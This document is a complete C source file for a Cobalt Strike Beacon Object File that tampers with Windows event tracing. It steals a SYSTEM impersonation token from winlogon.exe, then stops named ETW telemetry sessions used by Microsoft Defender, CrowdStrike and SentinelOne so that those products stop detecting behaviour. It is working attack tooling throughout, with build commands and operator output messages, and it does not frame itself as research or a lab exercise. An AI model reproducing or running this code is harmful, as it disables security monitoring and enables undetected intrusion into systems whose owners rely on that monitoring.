/*
 * etw_tamper.bof.c — Beacon Object File
 *
 * PURPOSE
 * -------
 * Stop named ETW (Event Tracing for Windows) sessions to blind EDR behavioral
 * detection. After session teardown, all providers writing to that session
 * lose their consumer and events are silently dropped.
 *
 * WHY THIS WORKS (ETW architecture)
 * -----------------------------------
 * The ETW pipeline:
 *
 *   [Kernel / User providers]
 *         |  (write events via EtwWrite / NtTraceEvent)
 *         v
 *   [ETW Session buffer]    ← Named session managed by NTOSKRNL
 *         |  (consumer reads events via ProcessTrace)
 *         v
 *   [Consumer process]      ← EDR agent (e.g. MsSense.exe, CSFalconService.exe)
 *
 * EDR agents register as real-time consumers on specific named sessions.
 * Key sessions:
 *
 *   "Microsoft-Windows-Sense"             MDE kernel telemetry session
 *   "CrowdStrike-Falcon-Sensor"           CS real-time event collection
 *   "SentinelOne-Sensor"                  S1 telemetry session
 *   "Microsoft-Windows-Threat-Intelligence" ETW-TI — broad kernel events
 *     (process creation, network connect, file access, memory read/write)
 *
 * ControlTraceW(..., EVENT_TRACE_CONTROL_STOP) instructs the ETW subsystem
 * to flush and tear down the named session. After teardown:
 *   - The consumer's ProcessTrace call returns ERROR_WMI_INSTANCE_NOT_FOUND
 *   - All kernel events that would have gone to that session are dropped
 *   - The EDR agent's behavioral detection loop is broken until it restarts
 *     the session (which typically requires the EDR service to restart)
 *
 * WHY SYSTEM TOKEN IS REQUIRED
 * ------------------------------
 * ETW sessions started by system services run under the SYSTEM account.
 * ControlTrace to stop a session owned by SYSTEM requires matching privileges.
 * An elevated Administrator token is NOT sufficient — you get ERROR_ACCESS_DENIED.
 *
 * Token theft approach:
 *   1. Enumerate processes with CreateToolhelp32Snapshot → find winlogon.exe
 *      (always runs as SYSTEM, always present on an interactive session)
 *   2. OpenProcess(PROCESS_QUERY_INFORMATION) → get SYSTEM process handle
 *   3. OpenProcessToken → get SYSTEM primary token
 *   4. DuplicateToken(SecurityImpersonation) → create impersonation token
 *   5. SetThreadToken(NULL, hDup) → current thread impersonates SYSTEM
 *   6. Call ControlTraceW under SYSTEM context
 *   7. SetThreadToken(NULL, NULL) → revert to original thread token
 *
 * EVENT_TRACE_PROPERTIES BUFFER LAYOUT
 * ---------------------------------------
 * ControlTraceW requires a caller-allocated buffer containing:
 *   [EVENT_TRACE_PROPERTIES struct]  ← fixed size
 *   [Logger name string]             ← wchar_t, at LoggerNameOffset
 *   [Log file name string]           ← wchar_t, at LogFileNameOffset (0 = none)
 *
 * We use a 1024-byte stack buffer:
 *   Wnode.BufferSize = 1024
 *   LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES)
 *   LogFileNameOffset = 0 (not logging to file)
 *   Session name is copied to (BYTE*)props + LoggerNameOffset
 *
 * MODES
 * -----
 *   0 — STOP: stop each named ETW session in the semicolon-separated list
 *   1 — QUERY: check whether each session exists (informational only)
 *
 * COMPILATION
 * -----------
 *   mingw64:  x86_64-w64-mingw32-gcc -o etw_tamper.x64.o -c etw_tamper.bof.c -masm=intel
 *   MSVC:     cl /c /TC /GS- /Foetw_tamper.x64.obj etw_tamper.bof.c
 *
 * beacon.h: https://github.com/trustedsec/CS-Situational-Awareness-BOF
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include <evntrace.h>
#include <tlhelp32.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────── */
DECLSPEC_IMPORT ULONG  WINAPI ADVAPI32$ControlTraceW(TRACEHANDLE, LPCWSTR,
                                                      PEVENT_TRACE_PROPERTIES, ULONG);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$DuplicateToken(HANDLE, SECURITY_IMPERSONATION_LEVEL,
                                                       PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$SetThreadToken(PHANDLE, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES,
                                                              DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT void*  WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);

/* RtlZeroMemory is a forwarder in kernel32 and not reliably exported on all
 * Windows builds. Use a volatile loop instead — avoids CRT and all DLL deps. */
static void ZeroMem(void* p, SIZE_T n) {
    volatile char* v = (volatile char*)p;
    SIZE_T i;
    for (i = 0; i < n; i++) v[i] = 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HELPER FUNCTIONS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Inline wchar_t tokenizer — no CRT wcstok needed.
 * Splits on ';'. Modifies buffer in-place.                                   */
static wchar_t* WNextTok(wchar_t** cursor) {
    wchar_t* start = *cursor;
    if (!start || *start == L'\0') return NULL;
    while (*start == L';') start++;
    if (*start == L'\0') { *cursor = start; return NULL; }
    wchar_t* p = start;
    while (*p && *p != L';') p++;
    if (*p == L';') { *p = L'\0'; *cursor = p + 1; }
    else            { *cursor = p; }
    return start;
}

/* wchar_t string length without CRT */
static int WLen(const wchar_t* s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

/* Case-insensitive wide string compare — returns TRUE if equal */
static BOOL WEqI(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t ac = *a, bc = *b;
        if (ac >= L'A' && ac <= L'Z') ac += 32;
        if (bc >= L'A' && bc <= L'Z') bc += 32;
        if (ac != bc) return FALSE;
        a++; b++;
    }
    return *a == L'\0' && *b == L'\0';
}

/* ═══════════════════════════════════════════════════════════════════════════
 * TOKEN THEFT — ACQUIRE SYSTEM TOKEN FROM winlogon.exe
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * FindWinlogonPid — walk the process list to find winlogon.exe PID.
 * Uses CreateToolhelp32Snapshot + Process32FirstW/Process32NextW.
 * Returns 0 if not found.
 *
 * winlogon.exe is guaranteed to be running on any interactive Windows session.
 * It runs as SYSTEM and has an easily accessible primary token.
 */
static DWORD FindWinlogonPid(void) {
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] CreateToolhelp32Snapshot failed: %lu\n",
            KERNEL32$GetLastError());
        return 0;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    DWORD pid = 0;

    if (KERNEL32$Process32FirstW(hSnap, &pe)) {
        do {
            /* Compare exe name without CRT */
            if (WEqI(pe.szExeFile, L"winlogon.exe")) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (KERNEL32$Process32NextW(hSnap, &pe));
    }

    KERNEL32$CloseHandle(hSnap);
    return pid;
}

/*
 * ImpersonateSystem — steal SYSTEM impersonation token from winlogon.exe.
 *
 * Steps:
 *   1. Find winlogon.exe PID
 *   2. OpenProcess with PROCESS_QUERY_INFORMATION
 *   3. OpenProcessToken for TOKEN_DUPLICATE
 *   4. DuplicateToken at SecurityImpersonation level
 *   5. SetThreadToken(NULL, hDup) — current thread now runs as SYSTEM
 *
 * Stores the duplicated token in *phDup so caller can close it and revert.
 * Returns TRUE on success.
 */
static BOOL ImpersonateSystem(HANDLE* phDup) {
    *phDup = NULL;

    DWORD winlogonPid = FindWinlogonPid();
    if (!winlogonPid) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] winlogon.exe not found — cannot steal SYSTEM token\n");
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "    Acquiring SYSTEM token from winlogon.exe (PID %lu)...\n",
        winlogonPid);

    HANDLE hProc = KERNEL32$OpenProcess(
        PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    if (!hProc) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] OpenProcess(winlogon PID=%lu) failed: %lu\n",
            winlogonPid, KERNEL32$GetLastError());
        return FALSE;
    }

    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] OpenProcessToken failed: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }
    KERNEL32$CloseHandle(hProc);

    HANDLE hDup = NULL;
    if (!ADVAPI32$DuplicateToken(hToken, SecurityImpersonation, &hDup)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] DuplicateToken failed: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }
    KERNEL32$CloseHandle(hToken);

    if (!ADVAPI32$SetThreadToken(NULL, hDup)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] SetThreadToken failed: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hDup);
        return FALSE;
    }

    *phDup = hDup;
    BeaconPrintf(CALLBACK_OUTPUT,
        "    [+] SYSTEM token acquired — impersonating\n");
    return TRUE;
}

/*
 * RevertSystem — revert thread token and close the duplicated token handle.
 */
static void RevertSystem(HANDLE hDup) {
    ADVAPI32$SetThreadToken(NULL, NULL);
    if (hDup) KERNEL32$CloseHandle(hDup);
    BeaconPrintf(CALLBACK_OUTPUT,
        "    Reverted thread token\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ETW SESSION CONTROL
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * ControlSession — stop or query a single named ETW session.
 *
 * EVENT_TRACE_PROPERTIES buffer layout (1024 bytes on stack):
 *   Offset 0:                    EVENT_TRACE_PROPERTIES struct
 *   Offset sizeof(struct):       session name (wchar_t, null-terminated)
 *
 * Key fields:
 *   Wnode.BufferSize     = total buffer size (1024)
 *   Wnode.Flags          = WNODE_FLAG_TRACED_GUID
 *   LoggerNameOffset     = sizeof(EVENT_TRACE_PROPERTIES)
 *   LogFileNameOffset    = 0 (no log file path needed for STOP/QUERY)
 *
 * The session name is written at LoggerNameOffset from the buffer start.
 * ControlTraceW reads it from there.
 *
 * Return values from ControlTraceW:
 *   ERROR_SUCCESS             session was stopped/queried
 *   ERROR_WMI_INSTANCE_NOT_FOUND  session does not exist
 *   ERROR_ACCESS_DENIED       insufficient privilege (need SYSTEM)
 *
 * action: EVENT_TRACE_CONTROL_STOP (1) or EVENT_TRACE_CONTROL_QUERY (0)
 */
static ULONG ControlSession(const wchar_t* sessionName, ULONG action) {
    /* 1024-byte stack buffer for EVENT_TRACE_PROPERTIES + name */
    BYTE propBuf[1024];
    ZeroMem(propBuf, sizeof(propBuf));

    EVENT_TRACE_PROPERTIES* props = (EVENT_TRACE_PROPERTIES*)propBuf;
    props->Wnode.BufferSize   = sizeof(propBuf);
    props->Wnode.Flags        = WNODE_FLAG_TRACED_GUID;
    props->LoggerNameOffset   = sizeof(EVENT_TRACE_PROPERTIES);
    props->LogFileNameOffset  = 0;

    /* Copy session name into buffer at LoggerNameOffset */
    int nameLen = WLen(sessionName);
    int maxNameChars = (int)(sizeof(propBuf) - sizeof(EVENT_TRACE_PROPERTIES)) / (int)sizeof(wchar_t) - 1;
    if (nameLen > maxNameChars) nameLen = maxNameChars;
    KERNEL32$RtlMoveMemory(
        propBuf + props->LoggerNameOffset,
        sessionName,
        (SIZE_T)nameLen * sizeof(wchar_t));
    /* null terminator is already in zeroed buffer */

    return ADVAPI32$ControlTraceW(0, sessionName, props, action);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * Argument format (packed by CNA with bof_pack("iZ", mode, sessions)):
 *
 *   [int32] mode
 *     0 = stop each named ETW session in the semicolon-separated list
 *     1 = query each session (check if running, report status)
 *
 *   [wchar_t* Z] sessions
 *     Semicolon-separated ETW session names, e.g.:
 *     "Microsoft-Windows-Sense;CrowdStrike-Falcon-Sensor"
 *
 * Default high-value targets (pass via CNA):
 *   Microsoft-Windows-Sense                 — MDE kernel telemetry
 *   Microsoft-Windows-Threat-Intelligence   — ETW-TI broad kernel events
 *   CrowdStrike-Falcon-Sensor               — CS event collection
 *   SentinelOne-Sensor                      — S1 telemetry
 *
 * Privilege requirement:
 *   SYSTEM token required to stop system-owned ETW sessions.
 *   This BOF steals the SYSTEM token from winlogon.exe automatically.
 *   Admin elevated token alone is NOT sufficient for system ETW sessions.
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    LONG     mode    = BeaconDataInt(&parser);
    int      argBytes = 0;
    wchar_t* rawArg  = (wchar_t*)BeaconDataExtract(&parser, &argBytes);

    wchar_t buf[2048];
    int i;
    for (i = 0; i < 2048; i++) buf[i] = L'\0';
    if (rawArg && argBytes > 2) {
        int n = argBytes / (int)sizeof(wchar_t);
        if (n >= 2048) n = 2047;
        KERNEL32$RtlMoveMemory(buf, rawArg, n * sizeof(wchar_t));
        buf[n] = L'\0';
    }

    if (!buf[0]) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] No session list provided.\n"
            "    Usage: etw_tamper Microsoft-Windows-Sense;CrowdStrike-Falcon-Sensor\n"
            "    Use 'query' mode to check session names first.\n");
        return;
    }

    /* Count sessions */
    wchar_t countBuf[2048];
    KERNEL32$RtlMoveMemory(countBuf, buf, sizeof(wchar_t) * 2047);
    countBuf[2047] = L'\0';
    int total = 0;
    wchar_t* cc = countBuf;
    while (WNextTok(&cc) != NULL) total++;

    if (mode == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] ETW Tamper: stopping %d session(s)...\n", total);

        /* Acquire SYSTEM token — required to stop system-owned ETW sessions */
        HANDLE hDup = NULL;
        BOOL gotSystem = ImpersonateSystem(&hDup);
        if (!gotSystem) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [!] Could not acquire SYSTEM token.\n"
                "      Attempting ControlTrace anyway (may fail with ACCESS_DENIED).\n");
        }

        int stopped = 0, notfound = 0, failed = 0;
        wchar_t workBuf[2048];
        KERNEL32$RtlMoveMemory(workBuf, buf, sizeof(wchar_t) * 2047);
        workBuf[2047] = L'\0';
        wchar_t* cursor = workBuf;
        wchar_t* tok;

        while ((tok = WNextTok(&cursor)) != NULL) {
            ULONG ret = ControlSession(tok, EVENT_TRACE_CONTROL_STOP);
            if (ret == ERROR_SUCCESS) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [+] Session '%S' STOPPED\n"
                    "      EDR behavioral detection is now blind\n", tok);
                stopped++;
            } else if (ret == 0x80071069 ||   /* ERROR_WMI_INSTANCE_NOT_FOUND */
                       ret == ERROR_NOT_FOUND) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [-] Session '%S' not found (not running)\n", tok);
                notfound++;
            } else if (ret == ERROR_ACCESS_DENIED) {
                BeaconPrintf(CALLBACK_ERROR,
                    "  [!] Session '%S' — ACCESS DENIED\n"
                    "      SYSTEM token required. Ensure winlogon.exe is accessible.\n", tok);
                failed++;
            } else {
                BeaconPrintf(CALLBACK_ERROR,
                    "  [!] Session '%S' — ControlTrace failed: 0x%08X\n", tok, ret);
                failed++;
            }
        }

        if (gotSystem) RevertSystem(hDup);

        int found = stopped + failed;
        BeaconPrintf((stopped == found && found > 0) ? CALLBACK_OUTPUT : CALLBACK_ERROR,
            "[*] RESULT: %d/%d found session(s) stopped\n",
            stopped, found);

        if (notfound > 0)
            BeaconPrintf(CALLBACK_OUTPUT,
                "    (%d session(s) were not running on this host)\n", notfound);

    /* ── MODE 1: QUERY (informational) ──────────────────────────────────── */
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] ETW Tamper: querying %d session(s)...\n", total);

        wchar_t workBuf[2048];
        KERNEL32$RtlMoveMemory(workBuf, buf, sizeof(wchar_t) * 2047);
        workBuf[2047] = L'\0';
        wchar_t* cursor = workBuf;
        wchar_t* tok;

        while ((tok = WNextTok(&cursor)) != NULL) {
            ULONG ret = ControlSession(tok, EVENT_TRACE_CONTROL_QUERY);
            if (ret == ERROR_SUCCESS) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [R] Session '%S' is RUNNING\n"
                    "      Use mode 0 to stop it.\n", tok);
            } else if (ret == 0x80071069 || ret == ERROR_NOT_FOUND) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [ ] Session '%S' not found\n", tok);
            } else if (ret == ERROR_ACCESS_DENIED) {
                BeaconPrintf(CALLBACK_ERROR,
                    "  [?] Session '%S' — ACCESS DENIED (exists but no read access)\n", tok);
            } else {
                BeaconPrintf(CALLBACK_ERROR,
                    "  [?] Session '%S' — query returned 0x%08X\n", tok, ret);
            }
        }
    }
}
